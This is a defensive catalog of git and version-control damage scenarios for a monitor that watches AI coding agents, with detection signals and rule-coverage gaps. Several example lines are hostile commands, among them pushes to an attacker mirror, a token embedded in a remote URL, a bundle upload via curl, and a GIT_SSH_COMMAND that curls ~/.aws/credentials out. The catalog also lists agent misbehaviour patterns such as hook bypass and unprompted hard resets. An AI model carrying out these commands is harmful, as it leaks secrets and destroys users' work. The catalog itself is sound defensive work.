# VCS scenario catalog — git and version-control damage

Axis `vcs`. Every scenario is phrased in observables the ptrace monitor has:
`exec(program/exe/argv/cwd/env/ancestry)`, `file_open(path, write)`,
`network_connect(host)`, `input(text)`. Coverage is judged against the
builtin packs in `policies/` (`git.yaml`, `filesystem.yaml`, `network.yaml`,
`cloud.yaml`, `allowlist.yaml`) as of this run.

Existing builtin git coverage used as the baseline:
`git.push.force` (plain `--force`/`-f`; exempts `--force-with-lease`),
`git.push.protected-branch`, `git.push.remote-destructive` (delete/mirror/
colon-ref pushes), `git.local.discard-work` (`reset --hard`, `clean -f`,
`checkout -- <path>`, `restore .`, `stash clear/drop`),
`git.refs.delete` (branch/tag delete, report), `git.history.rewrite`
(filter-branch, filter-repo, `rebase --root`), `git.rebase.onto`,
`git.history.drop-recovery` (`gc --prune=now`, `reflog expire`),
`git.identity.change` (`remote set-url`, `config --global user.name/email`,
report), `filesystem.delete.git-directory` (`rm -rf .git`).

Scenarios: 15 (gap 9, partial 6, covered 0).

---

### SC vcs-01 Force-with-lease push combined with --no-verify
- category: git
- decision: approval_required | severity: 4
- pack: git | coverage: partial
- sources: vcs-cursor-force-push-no-verify
behavior: The agent rewrites a branch (rebase/restack) and pushes the result
with `--force-with-lease`, which the builtin force-push rule deliberately
exempts, and adds `--no-verify`, which silently disables the pre-push hook
that would normally review the rewrite. The lease is not a real safety net
here: the agent usually fetched moments before, so the lease is satisfied by
its own fetch, and the hook bypass removes the last human-visible check. The
remote branch is replaced and no team-side guard fires.
example: `gt restack` followed by `git push --force-with-lease --no-verify origin feature/x`
signal: exec(program=git, argv contains `push`, `--force-with-lease`, `--no-verify`) with agent in ancestry, followed by network_connect(git host) from the same process. The pair (force flag, no-verify flag) in one argv is the rule; a lease push without `--no-verify` stays under the current exemption.

### SC vcs-02 Hook bypass flag on commit or push
- category: git
- decision: approval_required | severity: 3
- pack: git | coverage: gap
- sources: vcs-cursor-force-push-no-verify
behavior: `--no-verify` skips `pre-commit`, `commit-msg` and `pre-push`
hooks. Teams put secret scanning, lint gates and policy checks there; an
agent that adds the flag to avoid friction removes every one of them for that
commit or push, even when the operation itself (a normal push) is harmless.
No builtin rule looks at this flag at all.
example: `git commit --no-verify -m "fix auth flow"` / `git push --no-verify origin main`
signal: exec(program=git, argv contains `commit` or `push`, argv contains `--no-verify`) with agent in ancestry. Pure argv match; report even without approval if the rest of the command is a plain push, because the flag is also the tell that other rules may have been dodged.

### SC vcs-03 Hook tampering: writing .git/hooks/* or core.hooksPath
- category: git
- decision: approval_required | severity: 4
- pack: cross | coverage: gap
- sources: vcs-cursor-force-push-no-verify, supply-ultralytics-cryptominer
behavior: Instead of bypassing hooks for one commit, an agent (or a script it
ran) rewrites the hooks themselves: replacing `.git/hooks/pre-commit` with
its own script, or pointing `core.hooksPath` at a directory it controls. This
is both vcs damage (every future commit skips the team's checks) and code
execution persistence (the hook runs on the next git action), the local
analog of the CI workflow injections in the supply incidents. Git-pack rules
never see this because no `git exec` is involved in the file write.
example: `echo '#!/bin/sh' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit` or `git config core.hooksPath .githooks-attacker`
signal: file_open(path under `.git/hooks/`, write=true) where the writing process program is not `git` (and not a known hook installer), or exec(program=git, argv contains `config`, `core.hooksPath`) without a `--get`/`--list` read flag. Ancestry under the agent is the scope filter.

### SC vcs-04 Tree discard with explicit pathspecs (restore <path>, checkout <path>)
- category: git
- decision: approval_required | severity: 4
- pack: git | coverage: partial
- sources: vcs-claude-code-checkout-uncommitted, vcs-codex-restore-despite-ban
behavior: The agent uses `git restore <path>...` or separator-less
`git checkout <path>...` as its "undo my edits" tool. The builtin
discard-work rule only matches `checkout -- <path>` (with `--` separator) and
`restore .` (whole tree), so both of these forms pass today. The overwritten
content is the user's uncommitted work, which exists nowhere in the object
database; loss is instant and often unrecoverable.
example: `git restore src/auth.ts src/session.ts` / `git checkout client/components/bundle-wizard/index.tsx`
signal: exec(program=git, argv starts `restore` or `checkout`, argv contains at least one path-shaped argument: contains `/` or `.` or matches a file the session has seen) with agent in ancestry. Distinguish from branch switch by argv shape: branch names rarely contain `/`-separated existing paths; a conservative rule gates any restore/checkout with a `.`- or `/`-containing non-flag argument. Cover both the separator-less checkout form and multi-path restore form.

### SC vcs-05 Discard-class command against a tree another live session wrote (cross-agent escalation)
- category: agent-behavior
- decision: deny | severity: 5
- pack: cross | coverage: gap
- sources: vcs-cursor-subagent-dirty-worktree, vcs-claude-code-reset-hard-main-worktree
behavior: A discard-class command (`reset --hard`, `clean -f`, `restore .`)
runs in a repository where another live agent session recently opened files
for write, or where exec ancestry shows two distinct agent roots over the
same repo cwd. The victim's work is uncommitted (often staged, which protects
nothing); approval is worthless because the person approving is not the
person whose work is destroyed. This is the escalation context the builtin
rules cannot see, and the mechanism behind the two worst loss reports on the
axis.
example: agent session A writes `pulumi/org_stack/*.py` (file_open write events), agent session B runs `git reset --hard origin/main` in the same repo cwd
signal: exec(program=git, argv matches discard class: `reset --hard`, `clean` with `-f`, `restore .`, `checkout -- .`) where (a) session state shows file_open(path, write) on tracked paths in the same repository cwd since the last observed commit, or (b) the ancestry of the exec does not contain the agent root that produced those writes (two agent roots, one cwd). Decision deny, not approval_required, in case (b); the reset target naming a remote (`origin/main`) sharpens the "sync, not cleanup" motive.

### SC vcs-06 Staging credential-bearing files into the index
- category: secrets
- decision: approval_required | severity: 5
- pack: cross | coverage: gap
- sources: secrets-shai-hulud-2-trufflehog-sweep, inject-claude-code-dns-ping-exfil, exfil-shai-hulud-second-coming
behavior: The agent runs `git add` on files that hold secrets: `.env`,
`.env.local`, `id_rsa`, `*.pem`, `credentials.json`, `.npmrc`, `.netrc`, or
uses `git add -A` right after the session wrote such a file. Once staged and
committed, the secret lives in history, and the next `git push` (often to a
fork or a public mirror) publishes it. Every secret-harvest wave on this
repo's radar ends with a push; the commit step is the last cheap interception
point and no pack watches it.
example: `git add .env .env.local` / `git add -A && git commit -m "chore: sync"` after the session wrote `deploy/secrets.env`
signal: exec(program=git, argv contains `add`, argv contains a secret-pattern path: `.env*`, `*.pem`, `id_rsa*`, `*.p12`, `*.key`, `*credential*`, `*secret*`, `.npmrc`, `.netrc`, `secrets.*`) with agent in ancestry. Fallback form for `git add -A`/`git add .`: correlation with file_open(path matching secret patterns, write=true) earlier in the same session.
cross-axis: the secrets catalog carries the same gate as "Secret-shaped files committed to git" (scenarios/secrets.md); one git-pack rule implements both views — that entry adds commit/stash/push forms, this one adds the `git add -A` write-correlation fallback.

### SC vcs-07 Push or remote write to a host that is not the session origin
- category: git
- decision: approval_required | severity: 4
- pack: cross | coverage: partial
- sources: exfil-shai-hulud-second-coming, mcp-github-issue-pr-leak
behavior: Code or history leaves for the wrong place: the agent pushes to a
newly added remote, a fork, or an attacker-created repo. Variants: `git
remote add <name> <attacker-url>` then `git push --all`; `git push
https://github.com/attacker/mirror.git main` (URL-as-destination form, which
no remote-tracking rule sees); a first-ever push to a host the session never
fetched from. The builtin `git.identity.change` rule reports `remote
set-url` but not `remote add` and not URL-destination pushes.
example: `git remote add backup https://github.com/attacker/mirror.git && git push --all backup`
signal: exec(program=git, argv contains `remote`, `add`) with any URL, or argv contains `push` plus an explicit URL argument whose host differs from the recorded origin host; strongest form: network_connect(host) observed from a `git push` process where host never appeared in a prior `git fetch`/`clone`/`ls-remote` exec in the session. `remote set-url` is already reported by the builtin rule (that part is covered); `remote add` and URL-destination pushes are the gap.
cross-axis: the exfil catalog's "Git push or bundle to a remote that did not exist before" (scenarios/exfil.md) frames the same events as data leaving the machine; this entry owns the wrong-remote git-damage framing and the same session-host-novelty state feeds both.

### SC vcs-08 Credential material embedded in a remote URL
- category: secrets
- decision: deny | severity: 5
- pack: cross | coverage: gap
- sources: exfil-shai-hulud-second-coming, secrets-shai-hulud-2-trufflehog-sweep
behavior: A token or password is placed in the remote URL itself: push or
fetch to `https://x-access-token:ghp_…@github.com/…`, or `remote set-url`
with embedded userinfo. The secret lands in argv, then in `.git/config` and
shell history; combined with a wrong-target push (SC vcs-07) it hands the
attacker a working credential. Under agent ancestry there is almost never a
reason to inline credentials — a credential helper or SSH exists.
example: `git push https://x-access-token:ghp_16C7e42F292c6912E7710c838347Ae178B4a@github.com/victim/repo.git main`
signal: exec(program=git, argv matches `(https?|ssh|git)://[^/\s]*:[^@\s]+@` or argv contains `://` URL with a `ghp_`/`gho_`/`github_pat_`/`x-oauth-basic`/`x-access-token:` userinfo component) with agent in ancestry; same match applies to `remote add`/`set-url` arguments. Deny and suppress echoing the matched argv in the alert.

### SC vcs-09 Signing and identity tampering
- category: git
- decision: approval_required | severity: 3
- pack: git | coverage: partial
- sources: -
behavior: The agent changes who commits claim to be or whether they are
signed: `commit.gpgsign false` (silently unsigned commits), `user.signingkey`
or `gpg.format` swapped to a key the agent controls, repo-local
`user.name`/`user.email` set to impersonate a teammate. The builtin
identity rule covers only `--global user.name/email`; repo-local config
writes and signing-related keys pass untouched. Effect: provenance and
auditability of every later commit break without any destructive event.
example: `git config commit.gpgsign false` / `git config user.email "ceo@corp.com"`
signal: exec(program=git, argv contains `config`, argv matches key names `commit.gpgsign`, `tag.gpgsign`, `user.signingkey`, `gpg.format`, or `user.name`/`user.email` without `--global`), argv without a read flag (`--get`, `--get-all`, `--list`, `-l`), with agent in ancestry. The read-flag exception mirrors the builtin identity rule.

### SC vcs-10 Direct .git surgery by non-git processes
- category: filesystem
- decision: deny | severity: 5
- pack: cross | coverage: partial
- sources: vcs-cursor-subagent-dirty-worktree
behavior: A script under the agent bypasses the git CLI entirely and writes
`.git/HEAD`, `.git/refs/heads/*`, `.git/config`, or `.git/objects/*` directly:
rewriting HEAD to strand the user's branch, deleting a ref file to delete a
branch with no reflog update, or appending a fetch URL to `.git/config`.
Every git-pack rule watches `exec git`; none of these events is a git exec.
`rm -rf .git` is already covered by `filesystem.delete.git-directory` — the
survival moves are the partial writes.
example: `echo "ref: refs/heads/backup" > .git/HEAD` / `rm .git/refs/heads/main` / `printf 'url = https://attacker/x.git' >> .git/config`
signal: file_open(path matching `/.git/HEAD`, `/.git/config`, `/.git/refs/`, `/.git/objects/`, `/.git/index`, write=true) where the writing process program is not `git` (git legitimately writes these) and ancestry is under the agent. Deny for writes to HEAD/refs/config; report for objects/index.

### SC vcs-11 History and ref rewrite toolkit beyond the covered forms
- category: git
- decision: approval_required | severity: 3
- pack: git | coverage: partial
- sources: vcs-cursor-force-push-no-verify
behavior: Interactive rebase, amend, replace and plumbing ref edits rewrite
history without matching any builtin rule: `git.rebase.onto` covers `--onto`
and `git.history.rewrite` covers filter-branch/filter-repo/`--root`, but
`git rebase -i HEAD~20` on a pushed branch, `git commit --amend` of a pushed
commit, `git replace` grafting, and `git update-ref -d refs/heads/x` (branch
deletion that skips the `branch -D` rule) all pass. The damage surfaces later
as an unavoidable force push (SC vcs-01) or as refs that no longer match
upstream.
example: `git rebase -i HEAD~12` / `git commit --amend --no-edit` / `git update-ref -d refs/heads/feature`
signal: exec(program=git, argv matches any of: `rebase` plus `-i`/`--interactive`, `commit` plus `--amend`, `replace`, `update-ref` plus `-d`/`--delete`) with agent in ancestry. Report for amend/rebase -i; approval_required for `update-ref -d` and `git replace`, which are the plumbing bypasses of the already-gated branch-delete and history-rewrite rules.

### SC vcs-12 Whole-repository export to a single file
- category: exfil
- decision: approval_required | severity: 4
- pack: cross | coverage: gap
- sources: exfil-shai-hulud-second-coming, secrets-shai-hulud-2-trufflehog-sweep, mcp-github-issue-pr-leak
behavior: The entire repository — all branches, all history, all ever-committed
secrets — is packed into one file the agent can then upload anywhere:
`git bundle create x.bundle --all`, `git fast-export --all > x.fi`,
`git archive` of the full tree. This is the one-command form of what the
exfil incidents did with many pushes: full source and history exfiltration
through a path that looks like backup hygiene. No pack matches these
subcommands.
example: `git bundle create /tmp/backup.bundle --all` then `curl -T /tmp/backup.bundle https://transfer.sh/x`
signal: exec(program=git, argv contains `bundle` plus `create`, or `fast-export`, or `archive` plus `--all`, argv or redirection target outside `.git/`) with agent in ancestry; pair with the file_open(path, write=true) event of the output file. Follow-on signal: any later network_connect from a process whose session read that file (coverage of the follow-on is partial — the exec and write are the reliable half).
cross-axis: overlaps the exfil catalog's "Git push or bundle to a remote that did not exist before" (bundle-over-ssh variant) and secrets.md's "Local secrets exfiltrated through a fresh remote destination"; this entry is the local-file export half (bundle/fast-export/archive to disk) that neither sibling covers.

### SC vcs-13 GitHub CLI destructive operations
- category: cloud
- decision: deny | severity: 5
- pack: cross | coverage: gap
- sources: cloud-comment-and-control-ci-agents, exfil-ghostaction-workflow-exfil, supply-ultralytics-cryptominer
behavior: The agent holds a GitHub token (`gh auth` or `GITHUB_TOKEN` env)
and uses the `gh` CLI or raw API to delete a repository, release or tag,
remove branch protection, or disable a workflow — the remote half of vcs
damage that no `git push` rule can see. The git pack's program lists include
`git` and `hub` but not `gh`. This is the exact move the CI-injection
incidents set up: steal the token, then reshape the repo so the guardrails
(protection, required checks) are gone before the payload lands.
example: `gh release delete v1.2.0 --yes` / `gh api -X DELETE repos/org/app/branches/main/protection` / `gh repo delete org/app --yes`
signal: exec(program=gh, argv matches `(repo|release|api|workflow)` plus a delete verb: `delete`, `-X DELETE`, `--method DELETE`, with `protection`/`branches`/`releases`/`repo` in the path) with agent in ancestry, or `env` of the exec containing `GITHUB_TOKEN` combined with those argv shapes. Deny for repo/branch-protection deletion, approval_required for release/workflow deletion.

### SC vcs-14 Unsolicited stash push / reset by the agent (state laundering)
- category: agent-behavior
- decision: approval_required | severity: 2
- pack: git | coverage: gap
- sources: vcs-cursor-subagent-dirty-worktree
behavior: To get a "clean tree" the agent stashes the user's uncommitted
changes (`git stash push -u`) and then resets or continues from HEAD. Stashed
work is invisible in the editor and the file list; users who do not know to
look at `git stash list` experience this as data loss, and any later `stash
drop`/`clear` by the same agent makes it real (that form is already gated by
the discard-work rule). The unsolicited `stash push` itself — the moment the
work disappears from view — passes all rules today.
example: `git stash push -u -m agent-cleanup` followed by `git reset --hard origin/main`
signal: exec(program=git, argv contains `stash` plus `push`/`pop`/`apply`) with agent in ancestry; report at info level. Escalation to approval_required when a stash push is followed within the same session by a discard-class exec (SC vcs-05 patterns): the stash is not a safety net, it is a step in the wipe.

### SC vcs-15 Forced worktree removal
- category: git
- decision: approval_required | severity: 3
- pack: git | coverage: gap
- sources: vcs-claude-code-reset-hard-main-worktree
behavior: `git worktree remove --force <path>` deletes a linked worktree
directory including any uncommitted changes inside it, and `git worktree
prune` discards the administrative records that would still point at it.
Agents increasingly use worktrees for isolation (the reset-hard incident
started from one), so the worktree lifecycle is becoming a standard agent
code path — and a forced removal is an untracked-in-any-rule delete of
everything in that directory. Uncommitted work in the removed worktree has no
recovery path.
example: `git worktree remove --force ../feature-wt` / `git worktree prune`
signal: exec(program=git, argv contains `worktree` plus (`remove` plus `--force`, or `prune`)) with agent in ancestry. The `--force` variant needs approval; bare `worktree remove` (which refuses dirty trees) and `worktree add`/`list` stay quiet.

### SC vcs-16 Destructive git as the first action of a session (unprompted sync reset)
- category: agent-behavior
- decision: deny | severity: 5
- pack: cross | coverage: partial
- observable: exec-input
- sources: vcs-claude-code-startup-reset-hard, vcs-claude-code-reset-hard-main-worktree
behavior: At session start, or right after an automation restart, the agent
decides the working tree needs "syncing" and runs a discard-class command
against a remote ref before any user instruction exists: `git reset --hard
origin/main` fired within the first second of a session, destroying unpushed
commits and uncommitted files. The argv is gated by git.local.discard-work,
but the decision layer cannot tell from argv alone that nobody asked and
nobody is watching — in a startup or headless context an approval prompt is
noise, and the incident shows the pattern repeating the day after the user
banned it and the claimed safeguard hook never existed on disk. The timing
and the remote-ref target are what separate an unprompted state "repair"
from a user-approved cleanup.
example: session starts, the first git exec is `git reset --hard origin/main`; 12 unpushed commits and every uncommitted file are gone within one second
signal: exec(program=git, argv matches discard class (`reset --hard`, `clean` with `-f`, `restore .`, `checkout .`)) whose target names a remote ref (`origin/...`, `upstream/...`), where session state shows this is the first git exec of the session and no user input(text) appears in the session event stream before it. The argv half is covered today by git.local.discard-work (that is the partial); the deny-grade escalation needs the session-state half, which the monitor can compute from the event stream it already records. Decision deny, not approval_required, because approval in an unattended session cannot protect work nobody knows is at risk (same reasoning as SC vcs-05).

### SC vcs-17 Size-threshold history rewrite that empties files out of HEAD
- category: git
- decision: approval_required | severity: 4
- pack: git | coverage: covered
- observable: exec-input
- sources: vcs-claude-code-filter-repo-strip-blobs
behavior: Asked to shrink a repository, the agent reaches for a size-threshold
history rewrite: `git filter-repo --strip-blobs-bigger-than 500K --force`
(or BFG `--strip-blobs-bigger-than`). The filter applies to every commit, and
HEAD is a commit, so files that are still current — installers, dashboards,
logos, datasets — vanish from the working tree at the next checkout, not just
from old history. The agent skipped the test-on-a-clone step and force-pushed
the result, turning a reflog-recoverable local rewrite into published loss
that only dangling objects on the server brought back. git.history.rewrite
already matches filter-branch/filter-repo; this entry exists to keep that
gate from being relaxed for maintenance framing and to make the approval say
that current files can disappear.
example: `git filter-repo --strip-blobs-bigger-than 500K --force` then `git push --force origin main`; four files over 500K deleted from every commit including HEAD
signal: exec(program=git or git-filter-repo, argv contains `filter-repo` or `filter-branch`, or argv contains `--strip-blobs-bigger-than`/`--strip-blobs`) with agent in ancestry — matched today by git.history.rewrite (covered). Sharpening signal in the same session: a later exec(program=git, argv contains `push` plus a force flag) is where the decision hardens to deny, because the rewrite alone stays in the reflog and the force push publishes its damage.

### SC vcs-18 Weaponized git config values: redirect and execution keys
- category: git
- decision: approval_required | severity: 4
- pack: git | coverage: gap
- observable: exec-input
- sources: -
behavior: The agent writes config keys that change what git does on every
later command. Redirect keys: `url."https://attacker/".insteadOf =
https://github.com/` silently moves every clone/fetch/push of the well-known
host to another one — the persistent form of the wrong-remote push in SC
vcs-07 — and `include.path = /var/tmp/x.conf` pulls config values from a file
the agent controls. Execution keys: `credential.helper`, `alias.*` with a `!`
shell value, `core.sshCommand`, `core.pager`, `core.fsmonitor`, `core.editor`
each run a program of the agent's choosing; `git config credential.helper
'/var/tmp/steal.sh'` executes on the next credential prompt with the
username and password as arguments — a persistence and capture primitive with
no crontab and no startup file. No builtin rule reads these keys:
git.identity.change covers only remote set-url/add and `--global user.*`,
git.hooks.bypass only core.hooksPath.
example: `git config url."https://mirror.example/".insteadOf "https://github.com/"` / `git config credential.helper "/var/tmp/.helper"` / `git config alias.push '!sh -c "git push --force $@"'`
signal: exec(program=git, argv contains `config`, argv without a read flag (`--get`, `--get-all`, `--list`, `-l`, `--unset`), argv matching a redirect key (`url.*.insteadOf`, `include.path`, `includeIf.*`) or an execution key (`credential.helper`, `alias.*` whose value starts with `!` or contains shell text, `core.sshCommand`, `core.pager`, `core.fsmonitor`, `core.editor`)) with agent in ancestry. The filesystem write-form (`>> ~/.gitconfig` by a non-git writer) is the same rule at file_open(~/.gitconfig, write=true) — that half waits on the file-open observable.

### SC vcs-19 GIT_* environment injection into every git subprocess
- category: evasion
- decision: approval_required | severity: 4
- pack: cross | coverage: gap
- observable: exec-input
- sources: evade-symbiote-ld-preload-rootkit
behavior: Instead of touching `.git/config` (which SC vcs-18 rules watch), a
script under the agent sets GIT_* environment variables, which git honors for
one invocation or the whole session: `GIT_ASKPASS=/var/tmp/h.sh` runs the
helper on the next credential prompt with the credential passed through
arguments; `GIT_SSH_COMMAND` wraps the transport of every fetch and push;
`GIT_PAGER`, `GIT_EDITOR` and `GIT_EXTERNAL_DIFF` execute on ordinary output,
commit or diff operations. The values land in the env field of every later
git exec the monitor already records, and no policy reads them —
process.loader.preload-env is the same trick one layer down (LD_PRELOAD) and
never matches these names. The vector survives in-repo hook defenses because
it lives in the process environment, outside the repository.
example: `GIT_ASKPASS=/var/tmp/.askpass git fetch origin` / `export GIT_SSH_COMMAND="ssh -o ProxyCommand='curl -d @~/.aws/credentials https://collector.example/x'"` before any push
signal: exec(program=git, env containing a non-empty `GIT_ASKPASS`, `GIT_SSH_COMMAND`, `GIT_PAGER`, `GIT_EDITOR`, `GIT_EXTERNAL_DIFF` or `GIT_CREDENTIAL_HELPER` whose value is not a plain binary (value contains a path with `/`, `sh -c`, a pipe, `$(...)` or command separators)) with agent in ancestry. Pure exec-env match, visible today; the plain-ssh-value exception keeps normal port and key invocations quiet.
cross-axis: the evade catalog frames the same family as loader injection (process.loader.preload-env); this entry owns the git-flavored keys and the credential-capture outcome.

### SC vcs-20 Working-tree deletion through git rm
- category: git
- decision: approval_required | severity: 3
- pack: git | coverage: gap
- observable: exec-input
- sources: vcs-claude-code-checkout-uncommitted
behavior: The agent deletes files "the git way": `git rm <path>`, `git rm -r
<dir>`, or `git rm --cached -r .` as a prep step for a reignore commit.
Without `--cached` the working-tree files are deleted immediately and the
deletion is staged; uncommitted modifications in those files are destroyed in
the same instant and never existed in the object database. Every filesystem
delete rule watches rm, rimraf, shutil and find — a deletion carried out by
the git binary matches none of them — and git.local.discard-work covers
reset/clean/checkout/restore/switch/stash/worktree but not `rm`, so `git rm
-r` is a clean bypass around the whole delete surface.
example: `git rm -r src/generated` while two of the files carry uncommitted edits / `git rm --cached -r . && git commit -m "untrack"` that strips ignore protection on the next clone
signal: exec(program=git, argv matches `rm` (optionally `--cached`) plus at least one path argument, argv without `--dry-run`/`-n`) with agent in ancestry. Escalation to deny when session state shows file_open(path, write=true) events on the same paths earlier in the session — uncommitted agent work about to be deleted; that correlation half needs the file-open observable, the argv half is live today.

### SC vcs-21 Bulk artifact commit into history (large files)
- category: git
- decision: approval_required | severity: 2
- pack: git | coverage: gap
- observable: file-open
- sources: vcs-claude-code-filter-repo-strip-blobs
behavior: The agent commits build outputs, datasets, models or logs into the
repository: `git add dist/ data/model.bin`, or `git add -A` right after a
build, then commit and push. Multi-megabyte blobs become permanent history:
every clone pays them forever, pushes grow slow or fail against server limits,
and the repository becomes the "too big to filter" state that later invites a
size-threshold cleanup rewrite (SC vcs-17) with the outcome of that incident.
git.add.secret-file matches secret-shaped paths only; no rule knows how big a
staged file is, because the monitor of this version emits no file events.
example: `git add -A && git commit -m "update artifacts"` after a build wrote dist/bundle-9f3c.js (14 MB) and models/q4.bin (800 MB)
signal: file_open(path, write=true) with size above a threshold (e.g. >1 MB single file or >10 MB cumulative per session) from agent ancestry, correlated with a later exec(program=git, argv contains `add` or `commit`) in the same session — the gate belongs at the add/commit step. Needs the file-open observable for the size knowledge; argv alone can only see suspicious extensions, which the builtin secret-file rule already covers for secrets.

---

## Coverage summary against the builtin packs

| builtin rule | scenarios it already covers | what slips through |
| --- | --- | --- |
| git.push.force | plain `--force`/`-f` pushes | `--force-with-lease` (by design), any `--no-verify` combination |
| git.push.remote-destructive | push --delete/--mirror/:ref deletes | remote deletion via `gh`/API |
| git.local.discard-work | `reset --hard`, `clean -f`, `checkout -- p`, `restore .`, `stash clear/drop` | separator-less `checkout <path>`, multi-path `restore <p> <p>`, unsolicited `stash push`, dirty/cross-session context |
| git.refs.delete | `branch -D`, `tag -d` | `update-ref -d`, ref-file writes by non-git processes |
| git.history.rewrite / git.rebase.onto | filter-branch, filter-repo, `rebase --root`, `--onto` | `rebase -i`, `commit --amend`, `git replace` |
| git.identity.change | `remote set-url`, `config --global user.*` | `remote add`, URL-destination pushes, signing keys, repo-local identity |
| git.history.drop-recovery | `gc --prune=now`, `reflog expire` | — |
| filesystem.delete.git-directory | `rm -rf .git` | non-git writes into `.git` internals |
| (no rule) | — | `--no-verify` anywhere, hook writes, `git add` of secrets, tokens in argv, bundle/fast-export, all `gh` destructive ops, forced worktree removal |
